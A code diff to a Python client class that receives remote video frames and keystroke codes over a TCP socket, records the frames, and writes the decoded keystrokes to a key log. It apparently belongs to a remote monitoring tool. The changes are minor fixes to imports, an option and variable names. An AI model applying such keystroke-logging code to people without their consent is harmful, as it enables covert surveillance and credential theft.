@@ -4,12 +4,14 @@ import cv2
 from time import perf_counter
 from threading import Thread
 from PyQt5.QtCore import pyqtSignal
-from win32api import MapVirtualKey
+from win32api import *
 from collections import deque
 
 from socket import gethostname, gethostbyname
 from numpy import ndarray
 from zmq.sugar.frame import Frame
+
+MAPVK_VK_TO_CHAR = 2
 
 class Client():
     def __init__(self, win):
@@ -28,6 +30,7 @@ class Client():
             protocol="tcp",
             pattern=1,
             logging=False,
+            retCh=False,
             **options
         )
 
@@ -70,13 +73,13 @@ class Client():
             if self.win.rec:
                 self.writer.write(self.win.label.cvVer)
 
-            if data is not None and logger is not None:
+            if data is not None and self.win.keyLogger is not None:
                 data = deque(data)
                 while data:
                     item = data.popleft()
                     if item[0] == "P":
                         ASCII = MapVirtualKey(item[1], MAPVK_VK_TO_CHAR)
-                        self.win.logger.write(ch(ASCII))
+                        self.win.keyLogger.write(chr(ASCII))
 
 
     def close(self):
